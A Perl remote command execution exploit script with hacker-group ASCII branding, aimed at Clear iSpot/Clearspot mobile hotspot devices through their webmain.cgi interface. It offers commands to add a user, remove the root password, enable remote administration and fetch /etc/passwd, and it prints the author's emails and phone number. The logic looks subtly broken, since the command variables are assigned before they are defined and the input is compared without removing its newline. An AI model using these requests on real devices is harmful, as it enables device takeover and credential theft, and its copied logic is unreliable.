#!/usr/bin/perl
system("cls");
sub logo(){
print q'
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
1                      ______                                          0
0                   .-"      "-.                                       1
1                  / KedAns-Dz  \ =-=-=-=-=-=-=-=-=-=-=-|              0
0 Algerian HaCker |              | > Site : 1337day.com |              1
1 --------------- |,  .-.  .-.  ,| > Twitter : @kedans  |              0
0                 | )(_o/  \o_)( | > ked-h@hotmail.com  |              1
1                 |/     /\     \| =-=-=-=-=-=-=-=-=-=-=|              0
0       (@_       (_     ^^     _)  HaCkerS-StreeT-Team                1
1  _     ) \_______\__|IIIIII|__/_______________________               0
0 (_)@8@8{}<________|-\IIIIII/-|________________________>              1
1        )_/        \          /                                       0
0       (@           `--------` © 2011, Inj3ct0r Team                  1
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-0
0      Clear (iSpot/Clearspot) Reomte Command Execution Exploit        1
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-0
';
}
###
# Title : Clear (iSpot/Clearspot) Remote Command Execution Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com | ked-h@exploit-id.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Web Site : www.1337day.com / exploit-id.com
# Twitter page : twitter.com/kedans
# platform : hardware
# Impact : Remote Command Execution
##
# Real Bug : (http://exploit-db.com/exploits/15728) << By Trustwave's SpiderLabs
###
logo();
print "\n [*] Usage: $0 127.0.0.1\n\n";
print " [!] Command : 1 = Add New User \n";
print " [!] Command : 2 = Remove root password \n";
print " [!] Command : 3 = Enable remote administration access \n";
print " [!] Command : 4 = Download /etc/passwd file \n";
$ARGC=@ARGV;
if ($ARGC!=1) { 
   print "\n [*] f.ex: $0 41.126.3.1\n\n";
   exit(0);   
}
use LWP::Simple;
use LWP::UserAgent;
my $target = shift;
print "\n [+] Command : ";
$cmd = <stdin>;
print " ~~~~~~~~~~~~~~~\n";
  if ($cmd eq "1") {
    $CMD = $act1;
  } elsif ($cmd eq "2") {
    $CMD = $act2;
  } elsif ($cmd eq "3") {
    $CMD = $act3;
  } elsif ($cmd eq "4") {
    $CMD = $act4;
  }
$act1 = "cgi-bin/webmain.cgi?act=act_cmd_result&cmd=adduser%20-S%20kedans";
$act2 = "cgi-bin/webmain.cgi?act=act_cmd_result&cmd=passwd%20-d%20root";
$act3 = "cgi-bin/webmain.cgi?act=act_network_set&enable_remote_access=YES&remote_access_port=80";
$act4 = "cgi-bin/webmain.cgi?act=upgrademain.cgi?act=act_file_download&METHOD=PATH&FILE_PATH=/etc/passwd";
$attack = get("http://" .$target. "/" .$CMD);
print "\n [+] Execute the Command ...\n\n";
if ( $attack =~ /<cmdout>(.*)<\/cmdout>/)
    {
    print " [+] Successfully Executed $cmd \n\n";
    exit;
	}else
     {
     print " [-] Couldnt Execute Command $cmd \n";
	 exit;
	 }
sleep(1000);